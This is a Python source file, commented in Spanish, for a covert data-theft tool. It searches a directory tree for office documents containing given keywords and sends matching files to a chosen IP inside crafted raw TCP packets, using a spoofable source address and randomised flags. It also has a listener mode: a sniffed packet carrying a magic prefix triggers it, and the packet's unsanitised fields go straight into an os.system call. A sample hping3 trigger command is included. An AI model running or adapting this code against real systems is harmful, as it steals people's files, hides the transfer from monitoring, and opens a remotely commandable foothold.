import argparse
import os
import random
import threading

from scapy.all import *

import PyPDF2
import docx
import xlrd
import openpyxl
from pptx import Presentation

import math

import subprocess

# Evitar resolución ARP
conf.arp_resolve = False

# Función para buscar la palabra dentro de los archivos

class SearchAndSend():
    def __init__(self, searcher, network):
        filesFound = self.__searchWordInFiles(searcher)
        # Lanzar envío de ficheros
        if filesFound: self.__sendFiles(filesFound, network)

    def __searchWordInFiles(self, searcher):
        # Rutas de ficheros encontrados
        filesFound = []
        # Recorrer recursivamente directorio
        for root, dirs, fileNames in os.walk(searcher['rootPath']):
            for fileName in fileNames:
                filePath    = os.path.join(root, fileName)
                contentFile = "" # Inicializamos contenido donde se buscará
                # Obtener contenido según tipo de fichero
                try:
                    #PDF
                    if filePath.endswith('.pdf'):
                        with open(filePath, "rb") as _file:
                            for pageNumber, page in enumerate(PyPDF2.PdfReader(_file).pages):
                                contentFile += page.extract_text()
                    #DOCX
                    elif filePath.endswith('.docx'):
                        for paragraph in docx.Document(filePath).paragraphs:
                            contentFile += paragraph.text
                    #TXT
                    elif filePath.endswith('.txt'):
                        with open(filePath, "r") as _file:
                            contentFile = _file.read()
                    # XLS (Excel 97-2003)
                    elif filePath.endswith('.xls'):
                        for sheet in xlrd.open_workbook(filePath).sheets():
                            for row_idx in range(sheet.nrows):
                                contentFile += " ".join([str(cell.value) for cell in sheet.row(row_idx)])
                    # XLSX (Excel 2007+)
                    elif filePath.endswith('.xlsx'):
                        for sheet in openpyxl.load_workbook(filePath).sheetnames:
                            for row in openpyxl.load_workbook(filePath)[sheet].iter_rows(values_only=True):
                                contentFile += " ".join([str(cell) for cell in row])
                    # PPTX (PowerPoint)
                    elif filePath.endswith('.pptx'):
                        for slide in Presentation(filePath).slides:
                            for shape in slide.shapes:
                                if hasattr(shape, "text"):
                                    contentFile += shape.text
                    # ODT (OpenDocument Text)
                    elif filePath.endswith('.odt'):
                        for paragraph in OpenDocumentText(filePath).getElementsByType("text:p"):
                            contentFile += paragraph.firstChild.data
                    #Sin fichero
                    else:
                        pass

                    if not contentFile: continue

                    # Buscar palabra en el contenido del fichero
                    for word in searcher['keywords']:
                        # Si se encuentar es almacena ruta
                        if word.lower().strip() in contentFile.lower():
                            filesFound.append(filePath)
                except Exception as e:
                    # Si el archivo no se puede leer, ignorarlo
                    print(f"[!] Error al leer el fichero {filePath}: {e}")
        return filesFound

    def __sendFiles(self, filesFound, network):
        print(f"[!] Se han encontrado {len(filesFound)} ficheros")
        for filePath in filesFound:
            # Imprímir número de fichero a enviar
            print(f"\n[+] Fichero {filePath} con tamaño {os.path.getsize(filePath)} bytes")
            
            # Obtenemos el nombre del fichero
            fileName    = filePath.split("/")[-1].encode()
            
            # Enviar nombre fichero
            print(f"\t[1/3] Enviar nombre fichero.")
            self.__sendPackets(magic="1a2b3c4d", data=fileName, network=network)
            
            # Enviar fichero
            print(f"\t[2/3] Enviar contenido fichero.")
            with open(filePath, "rb") as _file:
                self.__sendPackets(magic="5e6f7g8h", data=_file.read(), network=network)
            
            # Enviar fin envío fichero
            print(f"\t[3/3] Enviar finalización envío.")
            self.__sendPackets(magic="", data=b"\0", network=network)

    def __sendPackets(self, magic, data, network):
        # Parámetros red
        srcIp      = network["sourceIp"]        # IP de origen
        destIp     = network["destinationIp"]   # IP de destino
        destMac    = "00:11:22:33:44:55"        # Dirección MAC
        srcPort    = network["sourcePort"]      # Puerto de origen
        destPort   = network["destinationPort"] # Puerto de destino
        tcpFlag    = network["tcpFlag"]
        randomFlag = False
        if tcpFlag == "random": randomFlag = True
        seqNum     = 1000   # Número de secuencia

        # Magic sender
        magic = magic.encode()

        # Cálculo de paquetes a enviar
        totalPackages  = math.ceil(sys.getsizeof(data)/1024)
        currentPackage = 1

        while data:
            # Aleatorizar tcp flag
            if randomFlag: tcpFlag = random.choice(["S", "A", "P", "F", "R", "U", "SA", "FA", "SF"])
            
            fragment = magic + data[:1016]  # Tomar el primer fragmento de 1016 bytes, hay que añadir el magic.
            eth      = Ether(dst=destMac)  # Dirección MAC de destino hardcodeada
            ip       = IP(src=srcIp, dst=destIp)
            tcp      = TCP(sport=srcPort, dport=destPort, flags=tcpFlag, seq=seqNum, ack=seqNum + len(fragment))
            packet   = eth / ip / tcp / Raw(fragment)
            sendp(packet, verbose=False)  # Usamos `sendp` para enviar el paquete Ethernet

            # Aumentar el número de secuencia y eliminar el fragmento enviado
            seqNum += len(fragment)
            data = data[1016:]  # Eliminar el fragmento enviado
            print(f"\t\tPaquete seqNum [{seqNum}]: {currentPackage} / {totalPackages}")
            currentPackage += 1

class WaitForOrder():
    # Constructor
    def __init__(self):
        print("[+][SENDER] Esperando paquetes...")
        # Crear un hilo para ejecutar el sniffing sin bloquear el hilo principal
        sniffThread        = threading.Thread(target=self.__sniffPackets)
        sniffThread.daemon = True  # Hace que el hilo se cierre cuando el programa principal termine
        sniffThread.start()

        while True:
            pass
    
    # Función para realizar el sniffing
    def __sniffPackets(self):
        # Captura paquetes de la interfaz de red por defecto
        sniff(iface="eth0", prn=lambda pkt: self.__processPacket(pkt), store=0)

    # Función para procesar los paquetes de sniffing
    ''' Test
        echo -n "1j2k3l4m./NAS|seguridad|192.168.1.11|S" | sudo hping3 -S -p 80 -s 12345 -d 38 -E /dev/stdin 192.168.1.100
    '''
    def __processPacket(self, packet):
        try:
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                packetData = packet[Raw].load
                # Recibir directorio raiz
                if packetData.decode().startswith("1j2k3l4m"):
                    packetData = packetData[8:].decode().split('|')
                    rootPath      = packetData[0]
                    keywords      = packetData[1]
                    destinationIp = packetData[2]
                    tcpFlag       = packetData[3]
                    print(f"\n\n[+] Nuevo comando recibido desde {packet[IP].src}")
                    print(f"[+] Recibido directorio raiz: {rootPath}")
                    print(f"[+] Recibido palabras clave: {keywords}")
                    print(f"[+] Recibida dirección ip destino: {destinationIp}")
                    print(f"[+] Recibida flag tcp: {tcpFlag}")
                    os.system(f"sudo python3 sender.py searchAndSend --rootPath {rootPath} --keywords {keywords} --destinationIp {destinationIp} --tcpFlag {tcpFlag}")
        except:
            pass

def menu():
    # Crear el parser
    parser = argparse.ArgumentParser(description="Envío de ficheros a través de capa de transporte (TCP).")

    # Definir el subcomando (modalidad)
    subparsers = parser.add_subparsers(dest="mode", required=True)

    # Modalidad 1: Buscar y enviar ficheros
    parserSearchAndSend = subparsers.add_parser("searchAndSend", help="Buscar ficheros por palabras clave y enviar fichero.")
    parserSearchAndSend.add_argument("--rootPath",        required=True, type=str, help="Directorio raiz dónde comenzar a buscar recursivamente.")
    parserSearchAndSend.add_argument("--keywords",        required=True, type=str, help="Palabras clave que se buscarán en cada fichero, separadas por coma.")
    parserSearchAndSend.add_argument("--sourceIp",        required=False, default="10.1.0.10", type=str, help="Dirección ip origen desde dónde se enviarán los ficheros.")
    parserSearchAndSend.add_argument("--sourcePort",      required=False, default=12345, type=int, help="Puerto origen desde dónde se enviarán los ficheros.")
    parserSearchAndSend.add_argument("--destinationIp",   required=True, type=str, help="Dirección ip dónde se enviarán los ficheros.")
    parserSearchAndSend.add_argument("--destinationPort", required=False, default=80, type=int, help="Puerto destino dónde se enviarán los ficheros.")
    parserSearchAndSend.add_argument("--tcpFlag",         required=True, type=str, choices=["S","A","P","F","R","U","SA","FA","SF","random"], help="Flag protocolo tcp.")

    # Modalidad 2: Esperar orden
    parserGet = subparsers.add_parser("waitForOrder", help="Esperar recibir una orden.")

    # Parsear los argumentos
    args     = parser.parse_args()
    return args

def main():
    # Lanzar menu
    args = menu()
    
    # Buscar ficheros por palabra clave y enviar ficheros a un destino
    if args.mode == "searchAndSend":
        searcher = {}
        network  = {}
        searcher["rootPath"]       = args.rootPath
        searcher["keywords"]       = args.keywords.split(',')
        network["sourceIp"]        = args.sourceIp
        network["sourcePort"]      = args.sourcePort
        network["destinationIp"]   = args.destinationIp
        network["destinationPort"] = args.destinationPort
        network["tcpFlag"]         = args.tcpFlag
        # Lanzar búsqueda de ficheros
        SearchAndSend(searcher, network)
    elif args.mode == "waitForOrder":
        try:
            WaitForOrder()
        except:
            pass

main()